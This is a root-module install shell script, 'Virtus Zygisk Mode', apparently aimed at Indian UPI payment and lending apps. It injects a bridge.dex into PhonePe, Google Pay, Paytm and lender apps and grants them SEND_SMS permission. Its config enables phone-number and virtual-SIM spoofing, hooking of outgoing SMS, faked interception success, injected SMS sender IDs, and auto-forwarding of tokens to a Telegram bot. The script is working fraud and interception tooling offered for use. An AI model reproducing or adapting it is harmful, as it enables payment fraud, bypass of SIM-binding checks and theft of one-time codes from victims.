#!/system/bin/sh
# Virtus Zygisk Mode — silent install (v1.0.49)

if [ -z "$MODPATH" ]; then
  ui_print "! ERROR: MODPATH not set"
  abort "Installation failed"
fi

set_perm_recursive "$MODPATH/zygisk" 0 0 0755 0644
[ -d "$MODPATH/ui" ] && set_perm_recursive "$MODPATH/ui" 0 0 0755 0644
[ -d "$MODPATH/docs" ] && set_perm_recursive "$MODPATH/docs" 0 0 0755 0644
[ -f "$MODPATH/bridge.dex" ] && set_perm "$MODPATH/bridge.dex" 0 0 0644
[ -f "$MODPATH/diag_bubble.sh" ] && set_perm "$MODPATH/diag_bubble.sh" 0 0 0755
[ -f "$MODPATH/repair_sim.sh" ] && set_perm "$MODPATH/repair_sim.sh" 0 0 0755
[ -f "$MODPATH/post-fs-data.sh" ] && set_perm "$MODPATH/post-fs-data.sh" 0 0 0755
[ -f "$MODPATH/service.sh" ] && set_perm "$MODPATH/service.sh" 0 0 0755
[ -f "$MODPATH/customize.sh" ] && set_perm "$MODPATH/customize.sh" 0 0 0755
[ -f "$MODPATH/config.json" ] && set_perm "$MODPATH/config.json" 0 0 0644
[ -f "$MODPATH/module.prop" ] && set_perm "$MODPATH/module.prop" 0 0 0644
[ -f "$MODPATH/overlay_install.sh" ] && set_perm "$MODPATH/overlay_install.sh" 0 0 0755

. "$MODPATH/overlay_install.sh" 2>/dev/null
MODDIR="$MODPATH"
hivirtus_repair_sim_settings 2>/dev/null
hivirtus_boot_activate_overlay 2>/dev/null
hivirtus_grant_overlay_permission 2>/dev/null
hivirtus_fix_zn_denylist 2>/dev/null
hivirtus_seed_app_writable_files 2>/dev/null

for pkg in com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm com.yespay.next com.herofincorp.diyjourneys com.customer.herofincorp com.kreditbee.android; do
  [ -d "/data/data/$pkg" ] || continue
  uid=$(stat -c %u "/data/data/$pkg" 2>/dev/null) || continue
  dest="/data/data/$pkg/code_cache/hivirtus"
  mkdir -p "$dest/ui" 2>/dev/null
  cp -f "$MODPATH/bridge.dex" "$dest/bridge.dex" 2>/dev/null
  cp -f "$MODPATH/ui/"* "$dest/ui/" 2>/dev/null
  chown -R "$uid:$uid" "$dest" 2>/dev/null
  chmod -R 755 "$dest" 2>/dev/null
done

if command -v pm >/dev/null 2>&1 && pm path com.hivirtus.zygiskmode >/dev/null 2>&1; then
  pm uninstall com.hivirtus.zygiskmode 2>/dev/null || true
fi

OLD_TG_TOKEN=""
OLD_TG_CHAT=""
OLD_PHONE=""
OLD_SENDER=""
for src in \
  /data/local/tmp/hivirtus_ui_save.json \
  /data/local/tmp/hivirtus_telegram_credentials.json \
  /data/local/tmp/hivirtus_zygisk_mode_config.json \
  "$MODPATH/ui_save.json" \
  "$MODPATH/config.json"
do
  [ -f "$src" ] || continue
  [ -z "$OLD_TG_TOKEN" ] && OLD_TG_TOKEN=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' "$src" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
  [ -z "$OLD_TG_CHAT" ] && OLD_TG_CHAT=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$src" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
  [ -z "$OLD_PHONE" ] && OLD_PHONE=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$src" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
  [ -z "$OLD_SENDER" ] && OLD_SENDER=$(grep -o '"inject_sender_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$src" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
done
[ -z "$OLD_PHONE" ] && [ -f /data/local/tmp/hivirtus_spoof_phone.txt ] && \
  OLD_PHONE=$(head -n1 /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null | tr -d '\r\n')
[ -z "$OLD_PHONE" ] && [ -f "$MODPATH/spoof_phone.txt" ] && \
  OLD_PHONE=$(head -n1 "$MODPATH/spoof_phone.txt" 2>/dev/null | tr -d '\r\n')
[ -z "$OLD_SENDER" ] && [ -f /data/local/tmp/hivirtus_sender_id.txt ] && \
  OLD_SENDER=$(head -n1 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null | tr -d '\r\n')
[ -z "$OLD_SENDER" ] && [ -f "$MODPATH/sender_id.txt" ] && \
  OLD_SENDER=$(head -n1 "$MODPATH/sender_id.txt" 2>/dev/null | tr -d '\r\n')
[ "$OLD_SENDER" = "AD-TEST-S" ] && OLD_SENDER=""

PHONE_ON=false
SPOOF_ON=false
VSIM_ON=false
if [ -n "$OLD_PHONE" ] && [ ${#OLD_PHONE} -ge 10 ]; then
  PHONE_ON=true
  SPOOF_ON=true
  VSIM_ON=true
fi
SENDER_ON=false
[ -n "$OLD_SENDER" ] && SENDER_ON=true

cat > "$MODPATH/config.json" << EOF
{
  "hide_root": false,
  "hide_developer": false,
  "enable_sim1_mock": ${PHONE_ON},
  "enable_phone_spoof": ${SPOOF_ON},
  "enable_virtual_sim": ${VSIM_ON},
  "mock_phone_sim1": "${OLD_PHONE}",
  "hook_outgoing_sms": true,
  "intercept_fake_success": true,
  "prefix_enabled": false,
  "prefix_text": "",
  "override_incoming_sender": ${SENDER_ON},
  "inject_sender_id": "${OLD_SENDER}",
  "auto_forward_token": true,
  "fake_intercept_telegram": true,
  "telegram_bot_token": "${OLD_TG_TOKEN}",
  "telegram_chat_id": "${OLD_TG_CHAT}",
  "hook_all_upi_apps": true,
  "auto_hook_foreground": true,
  "log_file": "/data/local/tmp/virtus_zygisk_mode.log"
}
EOF
set_perm "$MODPATH/config.json" 0 0 0644
cp -f "$MODPATH/config.json" /data/local/tmp/hivirtus_zygisk_mode_config.json 2>/dev/null
chmod 666 /data/local/tmp/hivirtus_zygisk_mode_config.json 2>/dev/null

if [ -n "$OLD_PHONE" ] && [ ${#OLD_PHONE} -ge 10 ]; then
  echo "$OLD_PHONE" > /data/local/tmp/hivirtus_spoof_phone.txt
  echo "$OLD_PHONE" > "$MODPATH/spoof_phone.txt"
  chmod 666 /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null
fi
if [ -n "$OLD_SENDER" ]; then
  echo "$OLD_SENDER" > /data/local/tmp/hivirtus_sender_id.txt
  echo "$OLD_SENDER" > "$MODPATH/sender_id.txt"
  chmod 666 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null
fi
if [ -f /data/local/tmp/hivirtus_ui_save.json ]; then
  cp -f /data/local/tmp/hivirtus_ui_save.json "$MODPATH/ui_save.json" 2>/dev/null
elif [ -f "$MODPATH/ui_save.json" ]; then
  cp -f "$MODPATH/ui_save.json" /data/local/tmp/hivirtus_ui_save.json 2>/dev/null
  chmod 666 /data/local/tmp/hivirtus_ui_save.json 2>/dev/null
fi

if [ -n "$OLD_TG_TOKEN" ] && [ -n "$OLD_TG_CHAT" ]; then
  printf '%s\n' "{\"telegram_bot_token\":\"${OLD_TG_TOKEN}\",\"telegram_chat_id\":\"${OLD_TG_CHAT}\"}" \
    > /data/local/tmp/hivirtus_telegram_credentials.json
  chmod 666 /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null
  rm -f /data/local/tmp/hivirtus_tg_test.request \
        /sdcard/Documents/hivirtus_tg_test.request \
        /sdcard/Download/hivirtus_tg_test.request 2>/dev/null
  echo "${OLD_TG_TOKEN}|${OLD_TG_CHAT}" > /data/local/tmp/hivirtus_tg_creds.hash 2>/dev/null
  PREV_SENT=$(cat /data/local/tmp/hivirtus_tg_test_sent.hash 2>/dev/null | tr -d '\r\n')
  CUR="${OLD_TG_TOKEN}|${OLD_TG_CHAT}"
  if [ "$PREV_SENT" = "$CUR" ]; then
    echo 1 > /data/local/tmp/hivirtus_tg_boot_sent.flag
  else
    rm -f /data/local/tmp/hivirtus_tg_boot_sent.flag 2>/dev/null
    echo 1 > /data/local/tmp/hivirtus_tg_test.request
    chmod 666 /data/local/tmp/hivirtus_tg_test.request 2>/dev/null
  fi
fi

: > /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
chmod 666 /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
rm -f /data/local/tmp/hivirtus_save_ok.flag 2>/dev/null
if [ -f /data/local/tmp/hivirtus_tg_boot_sent.flag ]; then
  rm -f /data/local/tmp/hivirtus_tg_test.request 2>/dev/null
fi

for pkg in com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
           com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm \
           com.myairtelapp com.yespay.next com.hdfcbank.payzapp com.axis.mobile in.org.npci.upiapp; do
  pm path "$pkg" >/dev/null 2>&1 || continue
  appops set "$pkg" SEND_SMS allow 2>/dev/null || cmd appops set "$pkg" SEND_SMS allow 2>/dev/null || true
  pm grant "$pkg" android.permission.SEND_SMS 2>/dev/null || true
done

hivirtus_apatch_allow_upi_inject 2>/dev/null

echo "1" > /data/local/tmp/hivirtus_module_installed.flag
chmod 644 /data/local/tmp/hivirtus_module_installed.flag 2>/dev/null
echo "1" > /data/local/tmp/hivirtus_zygisk_native.active
chmod 644 /data/local/tmp/hivirtus_zygisk_native.active 2>/dev/null
echo "v1.0.55" > /data/local/tmp/hivirtus_module_version.txt
chmod 666 /data/local/tmp/hivirtus_module_version.txt 2>/dev/null

# Silent SIM repair (v1.0.49/50 phone-hook breakage)
hivirtus_repair_sim_settings 2>/dev/null
am force-stop com.android.phone 2>/dev/null || true
am force-stop com.android.stk 2>/dev/null || true
for pkg in com.google.android.apps.messaging com.android.messaging \
           com.samsung.android.messaging com.motorola.messaging; do
  pm path "$pkg" >/dev/null 2>&1 || continue
  appops set "$pkg" SEND_SMS allow 2>/dev/null || cmd appops set "$pkg" SEND_SMS allow 2>/dev/null || true
  pm grant "$pkg" android.permission.SEND_SMS 2>/dev/null || true
done

# Seed diag files so user always sees them in file manager
: > /data/local/tmp/hivirtus_isms_trace.txt 2>/dev/null
chmod 666 /data/local/tmp/hivirtus_isms_trace.txt 2>/dev/null
echo '{"dest":"","body":"","note":"waiting_for_outgoing_verify"}' > /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
chmod 666 /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
rm -f /data/local/tmp/hivirtus_tg_out_dedupe.hash 2>/dev/null

ui_print "License done activated ✅"
